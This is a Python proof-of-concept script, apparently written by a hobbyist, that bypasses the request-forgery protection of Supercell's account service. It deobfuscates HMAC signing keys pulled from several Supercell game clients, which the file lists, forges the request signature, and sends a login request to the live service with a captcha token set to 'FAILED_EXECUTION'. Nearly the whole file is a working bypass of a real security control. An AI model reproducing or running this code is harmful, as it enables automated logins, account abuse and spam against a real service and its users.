import hmac
import base64
import urllib.parse
import requests
import time #ЕСЛИ ЧЕТА НЕТУ ИЗ ЭТАГА УСТАНОВИТЕ ХОТЯ ВРОДЕ ЭТО ДЕФОЛТ ЛИБЫ ПАЙТОНА

# Supercell ID "Request Forgery Protection" bypass by danyanull, 2025
# I know this code is holy crap but it's made as a PoC just for fun in about 2 hours

# Updates:
# February, 16: added shuffle() function to deobfuscate the key (it was previously manually deobfuscated by me) + added magic key
# February, 19: added keys for 4 games: squad, soil, scroll, reef. Thanks to: tailsjs (I did not check these games myself; so he decided to find the keys out and contribute)

def shuffle(base: bytes, seed: int) -> bytes:
	size = len(base)
	numbers = list(range(size))
	x = seed
	for i in range(size):
		j = (size - 1) - i
		# type(x) is uint32
		x = (0x19660D * x + 0x3C6EF35F) & 0xFFFFFFFF
		k = x % (j + 1)
		# swap the elements
		v = numbers[j]
		numbers[j] = numbers[k]
		numbers[k] = v
	offsets = [0] * size
	for i in range(size):
		offsets[numbers[i]] = i
	result = [0] * size
	for i in range(size):
		result[i] = base[offsets[i]]
	return bytes(result)


# Keys are subject to change and are different in different games
keychain = {
	"magic": shuffle(bytes.fromhex("ad161215d2216483441a3fc5ba0f18b108441584ba888e0f66d43a38f870c1b9"), 42), # CoC 17.18.5
	"laser": shuffle(bytes.fromhex("4d5875b5afc4aee2cffa68dfe5788d730e602e1cb6061ff3c3cb5ba37bd4bf58"), 42), # BS 59.197
	"squad": shuffle(bytes.fromhex("91128e16c76fd026366b5f10648d46240777d8d4fcf0b1287b796fa8e1056499"), 42), # SB 10.670.5 (by tailsjs)
	"soil": shuffle(bytes.fromhex("dd68010d2bec62c63fe89d562c07673d6f15ea3ef033a2814d3251157de55c46"), 42), # HD 1.64.109 (by tailsjs)
	"scroll": shuffle(bytes.fromhex("884e0665320eca797ac8bfed384b485b84039b441cbd0995483a796569eff170"), 42), # CR 9.198.22 (by tailsjs)
	"reef": shuffle(bytes.fromhex("c4957427c7657c14c92242aa67db1324875335ef027717640926785c4a36fb28"), 42), # BB 55.63 (by tailsjs)
}


def sign(timestamp: int, path: str, method: str, body: str, headers: dict[str, str], game: str) -> str:
	key = keychain.get(game)

	headers_str = ""
	headers_value_str = ""
	for header in ("Authorization", "User-Agent", "X-Supercell-Device-Id"):
		if header in headers:
			header_lower = header.lower()
			if len(headers_str) > 0:
				headers_str += ";"
			headers_str += header_lower
			headers_value_str += header_lower + "=" + headers[header]

	to_sign = f"{timestamp}{method}{path}{body}{headers_value_str}"
	x = hmac.digest(key, to_sign.encode("utf-8"), "sha256")
	xb = base64.b64encode(x).decode("utf-8").replace("+", "-").replace("/", "_").replace("=", "")
	return f"RFPv1 Timestamp={timestamp},SignedHeaders={headers_str},Signature={xb}"

ts = int(time.time())
host = "https://id.supercell.com"
path = "/api/ingame/account/login"
body = urllib.parse.urlencode({
	"lang": "en",
	"email": "shesterovmm@gmail.com", # Change this!
	"remember": "true",
	"game": "laser",
	"env": "prod",
	"unified_flow": "LOGIN",
	"recaptchaToken": "FAILED_EXECUTION", # And this!
	"recaptchaSiteKey": "6Lf3ThsqAAAAABuxaWIkogybKxfxoKxtR-aq5g7l"
})
headers = {
	"User-Agent": "scid/1.5.8-f (iPadOS 18.1; laser-prod; iPad8,6) com.supercell.laser/59.197",
	"Accept-Language": "en",
	"Accept-Encoding": "gzip",
	"X-Supercell-Device-Id": "1E923809-1680-535C-80F0-EFEFEFEFEF38", # And this too (maybe)
	"Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
	"Content-Length": str(len(body)),
	"Accept": None,
	"Connection": None
}

headers["X-Supercell-Request-Forgery-Protection"] = sign(ts, path, "POST", body, headers, "laser")

result = requests.post(f"{host}{path}", headers={k.lower(): v for k, v in headers.items()}, data=body)

print(result.status_code, result.json())